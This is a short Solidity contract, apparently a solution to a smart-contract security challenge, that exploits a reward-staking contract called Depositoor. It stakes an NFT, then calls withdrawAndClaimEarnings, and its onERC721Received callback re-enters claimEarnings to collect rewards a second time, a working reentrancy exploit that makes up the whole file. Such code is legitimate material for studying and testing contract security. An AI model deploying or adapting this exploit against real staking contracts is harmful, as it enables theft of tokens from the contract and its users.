// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import {IERC721Receiver,IERC721,IERC20,Depositoor,Context,Strings} from "../RewardToken.sol";

contract RewardTokenAttacker is Context,IERC721Receiver{
    using Strings for uint256;

    IERC721 public _nft;

    Depositoor _depositoor;

    IERC20 public _rewardToken;


    function stakeNFT(Depositoor depositoorAddress,uint256 tokenId) external {
        
        _depositoor = Depositoor(depositoorAddress);
        _nft = _depositoor.nft();
        _rewardToken = _depositoor.rewardToken();
        _nft.safeTransferFrom(address(this),address(_depositoor),tokenId);
    }


    // When some times passed after stakeNFT, execute the below function. Now test 10 seconds
    function attack(uint256 tokenId) external {
        _depositoor.withdrawAndClaimEarnings(tokenId);
    }

    function onERC721Received(
        address,
        address from,
        uint256 tokenId,
        bytes calldata
    ) external override returns (bytes4) {


        _depositoor.claimEarnings(tokenId);

        return IERC721Receiver.onERC721Received.selector;
    }

}